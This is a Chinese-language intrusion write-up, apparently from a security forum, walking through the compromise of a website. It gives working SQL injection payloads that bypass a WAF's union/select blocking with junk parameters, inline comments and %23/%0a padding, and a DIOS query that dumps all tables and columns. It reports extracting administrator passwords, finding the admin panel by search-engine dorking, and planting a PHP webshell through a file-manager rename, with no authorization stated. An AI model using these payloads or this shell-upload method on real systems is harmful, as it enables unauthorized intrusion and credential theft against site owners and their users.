0x01注入环节
========

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-67cc931705c82af442c9516e3a0690437f3186bc.png)

目标加单引号报错然后加闭合-- -返回正常确认存在注入

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-987f24032a184576ae6d50cae1397fc7664d32a3.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d9ce446988e4f694152975fc0b8beeef3db336d8.png)

OK第一步判断注入完成 然后我们order by 查看有多少个字段

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3b32f7eff5294365b7da0b0d59fdc52253847db3.png)

发现链接被重置某不知名WAF 我们这里第一手先尝试一手内联注入看是否能绕过order by检测

测试发现内联确实能绕过order by 的检测 payload /*!order*/ /*!by*/ 10-- -

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-27338eaf9ef3bcb4468fe237ab8a5ca27fe12713.png)

/*!order*/ /*!by*/ 18 18报错 17正常回显这里确定有17个字段然后我们进行union select

经测试发现内联无法绕过union select 这个站强制拦截 union 和 select关键字

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ed32491e467fb770bd8f1450e87d9413dcb9ce0e.png)

这里发现就算把union注释了也会被拦截

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1aa71d79a6a1d45aa54154b6c7a6cd77cc08a85d.png)

这个确实是比较麻烦他强制拦截这两个关键字给我们注入带来了非常多的麻烦

然后这里经过我的测试我构造出了一种办法来绕过他这个WAF的限制

第一种办法利用 and mod(35,12)取基数和偶数的办法来让WAF的拦截变弱然后再加上脏数据绕过

现在我们来复现第一种办法绕过此WAF

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-23bf0492432023675b854d4f44c3ec9fbb2fbee1.png)

这里发现构造and mod 还是会被拦截 然后我们这里继续构造一波垃圾参数 加and mod

来绕过他对union的拦截强度

什么是垃圾参数呢这里给大家讲一下当我们在url中输入：[http://http://www.0day.team//index.php?s=a](http://http//www.0day.team//index.php?s=a) select，那么页面会显示危险请求，但是当我们输入http://<http://www.0day.team//index.php?aaa=a> select页面则不作任何响应。因为服务器端的脚本并没有接收aaa参数他认为我们的语句已经被注释掉了，所以会给我们放行，而实际上a、aaa都是垃圾参数并没有被我们的动态脚本所处理，所以也不会影响程序功能

现在我们来实际操作一波这个拦截力度比较强的WAF

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3adc93a12fc161475d0a9aa654fb040ce81496d6.png)

这样去构造垃圾参数可以看到页面是正常访问的然后我们在id=10哪里正常输入我们的sql语句就行了

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2b788fe90b29cb12be625eabecaea610cfbbfb00.png)

```php
payload:detail.php?asdasdasdasd/*&id=10' and mod (35,12) union &asdasdas=1*/
```

这里可以发现已经不拦截union了可是这里比较鸡肋你把union和select连起来他会进行拦截这时候我们用构造脏数据的方法来进行绕过他的连接限制利用%23注释在里面添加脏数据然后利用%0a进行换行操作这样就可以成功绕过他这个WAF了

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cccb9c5f8fdbffdc2930196c1ba4c8824f407824.png)

```php
payload:detail.php?asdasdasdasd/*&id=10' and mod (35,12) union%23aasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdas%0aselect &asdasdas=1*/
```

可以发现现在已经成功的绕过了union select OK现在我们来继续操作  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-51818d9e457eab808351ce2db674a27e2ad4179a.png)

成功的到回显位6

```php
payload:detail.php?asdasdasdasd/*&id=.10' and mod (35,12) union%23aasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdas%0aselect 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- -&asdasdas=1*/
```

OK然后我们继续来操作 database()获取当前数据库

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-62cbee0889f0ffdd16a8982c8ea02d65db18d150.png)

可以发现数据库已经出来然后我们现在在来获取表

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b96c4ebaf1f39b289e7eaa5fb2e59d94254cb5d6.png)

现在可以发现表名已经出来了 还发现一个事情就是这个WAF好像只拦截union和select关键字这两个关键字有点难绕其他的都不拦截可惜可惜不然还可以在操作一波然后回到正题我们可以发现这个表实在是太多了我懒的一个一个找我这里直接构造一个爆表爆列的dios进行注入就行了

```php
payload:detail.php?asdasdasdasd/*&id=.10' and mod (35,12) union%23aasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdasaasadasdassdasdasdasdasdasdasdasdasdasdasdas%0aselect 1,2,3,4,5,concat((select @rui from(select (@rui:=0x00),(select @rui from information_schema.columns where table_schema=database() and @rui in(@rui:=concat(@rui,table_name,0x2d2d3e,column_name,0x3c62723e))))rui)),7,8,9,10,11,12,13,14,15,16,17-- -&asdasdas=1*/
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-de741e741dce78add93d05c0021b5c072ab759de.png)

这个是dios的效果然后我们这里直接搜索password关键字拿到后台账号密码就行了

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4d389143d27cc63fb7604336ab74f355bb118731.png)

已经找到了目标后台的账号密码表和列接下来直接注数据就行了

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-438d3d31c513686fe17ab51acf699bde7c607851.png)

可以看到所有的管理员用户密码我们已经拿到了接下来就进入找后台和拿shell环节

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f6f077f812c390a93cb591b952da805e13740588.png)

谷歌语法搜索发现目标管理后台接下来我们进行登录尝试

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f6a8ed576c44b85ec5a69394295725d38ee51193.png)

利用刚才注入出来的数据成功登录到了目标后台

0x02拿shell环节
============

接下来我们寻找上传点拿下目标shell

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ec33d5a4da5c34c0bd8405e20676869872d9fcf8.png)

这一处发现利用burp抓包修改jpg后辍能导致任意上传下面我们来实战进行测试

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-149f4ae5861332f6c6fbd5455f481a4fcf3cc5f9.png)

上传成功后发现php里面的内容被强制转换成图片了 这里发现比较鸡肋就没有跟深一步研究然后开始重新找其他上传点

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b8269a44482e8ba7db49503e86ac06d63c7f6cc5.png)

然后发现档案管理这里可以任意改文件名我在这里上传了一个图片格式的一句话然后改后缀为php成功拿下目标shell

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7fdb962df451b51548d6f8bf488e2683cb7dbcdc.png)

### 蚁剑链接图

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-42401a5c0f0a241165f657f470bc3abc0a0af035.png)